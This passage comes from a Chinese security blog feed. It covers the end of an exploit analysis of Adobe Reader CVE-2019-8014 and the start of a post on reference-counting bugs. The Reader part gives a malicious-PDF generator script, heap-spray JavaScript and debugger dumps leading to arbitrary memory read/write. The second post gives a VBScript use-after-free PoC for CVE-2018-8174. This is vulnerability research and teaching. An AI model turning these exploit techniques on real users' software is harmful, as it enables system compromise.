class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="5-5-利用技巧"><a href="#5-5-利用技巧" class="headerlink" title="5.5 利用技巧"></a>5.5 利用技巧</h3><h4 id="5-5-1-内存布局-1"><a href="#5-5-1-内存布局-1" class="headerlink" title="5.5.1 内存布局 (1)"></a>5.5.1 内存布局 (1)</h4><p>这里借助 <code>ArrayBuffer</code> 来完成内存布局。</p><p>因为位图解析过程中创建的堆块大小为 <code>0xF0</code> 字节，因此 <code>ArrayBuffer</code> 的 <code>byteLength</code> 可以设置为 <code>0xE0</code> 。为了创建内存空洞，可以先创建大量的 <code>ArrayBuffer</code> 对象，然后间隔释放其中的一半对象，理想情况下的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure><p>在触发漏洞时，位图解析相关的堆块会落到其中一个空洞上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure><p>因为可以向低地址方向越界写 <code>0xF4</code> 字节的 <code>0x10</code> 数据，所以触发漏洞之后，<code>ArrayBuffer</code> 对象的 <strong>backing store</strong> 的内存布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer 数据</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer 结束</span><br><span class="line">; 下一个堆块的元数据（存储位图数据的堆块）</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; 位图数据</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>此时 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成了 <code>0x10101010</code> ，但是 <code>DataView</code> 对象的指针也被改成了 <code>0x10101010</code> ，前面提到过这会导致进程崩溃。</p><h4 id="5-5-2-内存布局-0"><a href="#5-5-2-内存布局-0" class="headerlink" title="5.5.2 内存布局 (0)"></a>5.5.2 内存布局 (0)</h4><p>为了避免进程崩溃，需要提前在地址 <code>0x10101010</code> 上布局数据，让这个地址看起来就是一个 <code>DataView</code> 指针。很明显，为了漏洞利用更加稳定，我们需要一开始就在这里布局好数据。</p><p>同样，这里借助 <code>ArrayBuffer</code> 实现精确的内存布局：</p><ul><li>创建大量 <code>byteLength</code> 为 <code>0xFFE8</code> 的 <code>ArrayBuffer</code> </li><li>在特定内存范围内，<code>ArrayBuffer</code> 的 <strong>backing store</strong> 将有序的出现在地址 <code>0xYYYY0048</code> 上</li></ul><p>之所以选择 <code>0xFFE8</code> ，是因为这会使得 <strong>backing store</strong> 所在堆块整体的大小为 <code>0x10000</code> ：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>使用下面的代码进行内存布局，可以有效防止进程崩溃（具体细节不作讲解，相关条件很容易通过动态调试分析出来）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这仅仅只能防止漏洞触发后进程的崩溃，如果要为该 <code>ArrayBuffer</code> 关联新的 <code>DataView</code> 来读写数据，那么会导致新的崩溃。同样，填充一点新的数据就可以防止进程崩溃，新的代码如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 防止触发漏洞之后进程立刻 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 防止关联 DataView 对象时 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-5-3-全局读写"><a href="#5-5-3-全局读写" class="headerlink" title="5.5.3 全局读写"></a>5.5.3 全局读写</h4><p>当 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成 <code>0x10101010</code> 之后，可以基于这个 <code>ArrayBuffer</code> 对象修改下一个 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 。在基于 <code>ArrayBuffer</code> 创建内存空洞时，可以在每一个 <code>ArrayBuffer</code> 上存储特定的标记值，这样在内存中搜索 <code>ArrayBuffer</code> 对象就非常简单了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>当下一个 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成 <code>0xFFFFFFFF</code> 时，基于这个 <code>ArrayBuffer</code> 对象就可以实现用户态空间的全局读写了。</p><h4 id="5-5-4-任意地址读写"><a href="#5-5-4-任意地址读写" class="headerlink" title="5.5.4 任意地址读写"></a>5.5.4 任意地址读写</h4><p>一旦拥有全局读写的能力，我们就可以向低地址方向来搜索特定的关键字来定位 <code>ArrayBuffer</code> 对象在内存中的绝对地址，然后基于这个绝对地址来实现任意地址读写。</p><p>这里可以通过搜索 <code>ffeeffee</code> 或者 <code>f0e0d0c0</code> 来定位，为了提高准确性，需要同时校验关键字附近的数据的取值范围。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="5-5-5-剩余步骤"><a href="#5-5-5-剩余步骤" class="headerlink" title="5.5.5 剩余步骤"></a>5.5.5 剩余步骤</h4><p>在拥有任意地址读写能力之后，实现代码执行就是固定的套路了，本文对此不做详细介绍。</p><p>剩余的步骤如下：</p><ul><li>EIP 劫持</li><li>ASLR 绕过</li><li>DEP 绕过</li><li>CFG 绕过</li></ul><h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>前面提到一共找到了三处整数溢出，其中一处位于 RLE8 数据解析过程中，另外两处位于 RLE4 数据解析过程中。难道不应该有四个位置存在整数溢出吗？为什么只找到了三个？</p><p>因为有一个在六年前已经修复了（参考 <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a>）！从版本 <code>2019.012.20035</code> 中的代码也可以看到，确实有一个地方判断了整数溢出的情况，这就是 CVE-2013-2729 引入的补丁。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>然而 Adobe 仅仅修补了报告的这一个位置，而忽略了其他三个位置上的整数溢出。</p><h2 id="0x07-经验教训"><a href="#0x07-经验教训" class="headerlink" title="0x07. 经验教训"></a>0x07. 经验教训</h2><p>对厂商而言，在深入理解漏洞本质的同时，还可以看看是不是有类似的问题需要修复。</p><p>对安全研究人员而言，分析完漏洞之后还可以顺便看一下厂商的修复方式，也许不经意间就能发现新的漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前 &lt;strong&gt;&lt;del&gt;修复&lt;/del&gt;&lt;/strong&gt; 了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;本文作者：&lt;strong&gt;Ke Liu of Tencent Security Xuanwu Lab&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
      <category term="CVE-2019-8014" scheme="http://programlife.net/tags/CVE-2019-8014/"/>
    
      <category term="CVE-2013-2729" scheme="http://programlife.net/tags/CVE-2013-2729/"/>
    
      <category term="XFA" scheme="http://programlife.net/tags/XFA/"/>
    
      <category term="BMP" scheme="http://programlife.net/tags/BMP/"/>
    
      <category term="RLE" scheme="http://programlife.net/tags/RLE/"/>
    
  </entry>
  
  <entry>
    <title>引用计数相关漏洞案例</title>
    <link href="http://programlife.net/2019/07/03/reference-counting-vulnerability/"/>
    <id>http://programlife.net/2019/07/03/reference-counting-vulnerability/</id>
    <published>2019-07-03T00:13:37.000Z</published>
    <updated>2019-07-03T14:37:21.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>垃圾分类</strong> 是最近非常火爆的一个话题，其经常出现在各种新闻报道中，碰巧的是笔者最近也在研究 <strong>垃圾回收</strong> ，但此垃圾非彼垃圾，笔者研究的是程序设计语言中的 <strong>Garbage Collection</strong>（下文简称 <strong>GC</strong>）。</p><p>关于 GC 的入门读物，这里强烈推荐日本人在 2010 年出版的书籍《<strong>垃圾回收的算法与实现</strong>》。笔者在阅读该书的部分内容时，刚好想到了几个相关的漏洞，因此写篇文章记录一下。</p><a id="more"></a><h2 id="0x01-Python-析构函数"><a href="#0x01-Python-析构函数" class="headerlink" title="0x01. Python 析构函数"></a>0x01. Python 析构函数</h2><p>Python 基于引用计数来实现 GC 算法。在引用计数法中，各个对象的内部都有一个专门用于引用计数的成员，以及相应的操作函数 <code>inc_ref_count</code> 和 <code>dec_ref_count</code> 来增减引用计数。特别的，如果在 <code>dec_ref_count</code> 中，引用计数递减之后等于零，那么该对象就需要被回收掉了。</p><p>在 Python 中定义一个对象时，可以通过 <code>__init__</code> 定义构造函数、通过 <code>__del__</code> 定义析构函数。在引用计数变为 <code>0</code> 之后、销毁对象之前，Python 会检查对象是否定义了 <code>__del__</code> 函数，如果有，则调用之。相关的代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">slot_tp_del</span><span class="params">(PyObject *self)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> PyObject *del_str = <span class="literal">NULL</span>;</span><br><span class="line">    PyObject *del, *res;</span><br><span class="line">    </span><br><span class="line">    self-&gt;ob_refcnt = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 如果有 __del__ 就执行它 */</span></span><br><span class="line">    del = lookup_maybe(self, <span class="string">"__del__"</span>, &amp;del_str);</span><br><span class="line">    <span class="keyword">if</span> (del != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        res = PyEval_CallObject(del, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 省略部分：错误检查和后处理等 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (--self-&gt;ob_refcnt == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">/* 退出函数 */</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">/* 省略部分：最终化时有引用的情况下的应对处理 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在进入 <code>slot_tp_del</code> 之前，对象的引用计数已经为 <code>0</code> 了，但是在该函数中，在调用 <code>__del__</code> 函数之前将引用计数重新设置为 <code>1</code> ，而在调用之后则将引用计数减去 <code>1</code> 并判断结果是否为 <code>0</code> ，这里主要是判断在调用 <code>__del__</code> 的过程中是否又产生了新的引用。</p><p>像这样的判断是很有必要的，如果没有这样的判断，那么后面可能就直接把对象回收了，而如果 <code>__del__</code> 中产生了新的引用，那么就会导致 <a href="https://programlife.net/tags/Use-After-Free/">UAF</a> 。</p><h2 id="0x02-VBScript-Class-Terminate-UAF"><a href="#0x02-VBScript-Class-Terminate-UAF" class="headerlink" title="0x02. VBScript Class_Terminate UAF"></a>0x02. VBScript Class_Terminate UAF</h2><p>CVE-2018-8174 是 VBScript <code>Class_Terminate</code> 函数（析构函数）中引用计数处理不当导致的 UAF 漏洞，漏洞的细节可以参考 <a href="https://www.anquanke.com/post/id/170727" target="_blank" rel="noopener">安全客</a> 和 <a href="https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/" target="_blank" rel="noopener">卡巴斯基</a> 的分析文章。漏洞的 PoC 代码如下所示：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> arr(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">Dim</span> o</span><br><span class="line"></span><br><span class="line"><span class="keyword">Class</span> MyClass</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Sub</span> <span class="keyword">Class_Terminate</span></span><br><span class="line">        <span class="keyword">Set</span> o = arr(<span class="number">0</span>)</span><br><span class="line">        arr(<span class="number">0</span>) = &amp;h12345678</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> arr(<span class="number">0</span>) = <span class="keyword">new</span> MyClass</span><br><span class="line"><span class="keyword">Erase</span> arr</span><br><span class="line"></span><br><span class="line"><span class="comment">' Trigger UAF</span></span><br><span class="line"><span class="built_in">MsgBox</span> o</span><br></pre></td></tr></table></figure><p>这里在清空数组时，会依次清空数组中的元素。<code>arr(0)</code> 保存了 <code>MyClass</code> 对象的引用，因此最终会触发 <code>MyClass</code> 的析构函数，而在该析构函数中又重新引用了对象本身；由于 VBScript 引擎没有处理好这种情况，这里对象会被回收，后续再次使用对象时便会触发 UAF 。</p><p>这里触发漏洞的模式，和上面提到的 Python 代码非常相似，只是这里 VBScript 引擎并没有考虑到对象在析构函数中被重新引用这一情况。</p><h2 id="0x03-整数溢出问题"><a href="#0x03-整数溢出问题" class="headerlink" title="0x03. 整数溢出问题"></a>0x03. 整数溢出问题</h2><p>大家可能会想，引用计数不会存在整数溢出问题吗？理论上是可以的，但实际上通常不会出现这样的情况！</p><p>引用计数器的类型可以使用 <strong>平台相关</strong> 的整数类型，比如 <code>32</code> 位环境下使用 <code>32</code> 位的计数器，<code>64</code> 位环境下使用 <code>64</code> 位的寄存器。这里以前者为例分析溢出时的情况：</p><p>假如使用无符号类型的引用计数，那么要存在 <code>2^32</code> 个引用才会产生溢出，这里 <code>2^32 = 4GB</code> ；而产生一个引用计数至少要占用一定的内存（比如在脚本语言中定义一个变量），即便是 <code>4</code> 字节就需要占用 <code>16GB</code> 的内存，而实际情况则肯定是 <code>16GB</code> 的数倍。</p><p>在 <code>32</code> 位环境下，在触发整数溢出前，早就触发了 <strong>OOM</strong> （Out-Of-Memory）异常；在 <code>64</code> 位下，同样也会导致 OOM ；此外，实现整数溢出的时间，可能也是难以接受的。</p><p>相关案例可以参考 Firefox 的一个 Issue ：<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1352093" target="_blank" rel="noopener">Use-after-free due to ref counter overflow in CanvasRenderingContext2D</a> 。</p><h2 id="0x04-Firefox-SharedArrayBuffer-UAF"><a href="#0x04-Firefox-SharedArrayBuffer-UAF" class="headerlink" title="0x04. Firefox SharedArrayBuffer UAF"></a>0x04. Firefox SharedArrayBuffer UAF</h2><p>上面提到，<strong>通常情况下</strong> 不存在引用计数溢出的问题，但 <strong>特殊情况下</strong> 这也是需要考虑的一个问题！<a href="https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak" target="_blank" rel="noopener">Share with care: Exploiting a Firefox UAF with shared array buffers</a> 就是一个很好的例子。</p><p>所谓特殊情况，无非就是在可以接受的时间消耗和内存占用的情况下，不断增加对象的引用计数并最终导致其溢出的情况。</p><p>在上述文章中提到，Firefox 的 <code>SharedArrayBuffer</code> 使用了 <code>uint32_t</code> 类型的引用计数器，并且不会检查溢出问题，这就存在整数溢出的可能性。</p><p>此外，在特定的漏洞场景下，利用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker" target="_blank" rel="noopener">Web Worker</a> 序列化（使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" target="_blank" rel="noopener">结构化克隆算法</a> ）<code>SharedArrayBuffer</code> 对象时，可以在不创建新的 <code>SharedArrayBuffer</code> 的情况下（也不需要定义额外的变量）增加原有 <code>SharedArrayBuffer</code> 的引用计数，这就消除了触发整数溢出需要占用大量内存的情况。</p><p>最后，文章使用了一个小技巧来缩短触发漏洞所需要的时间，即通过 <code>postMessage</code> 到自身（不是发送给其他 Web Worker ）来创建指向同一个 <code>SharedArrayBuffer</code> 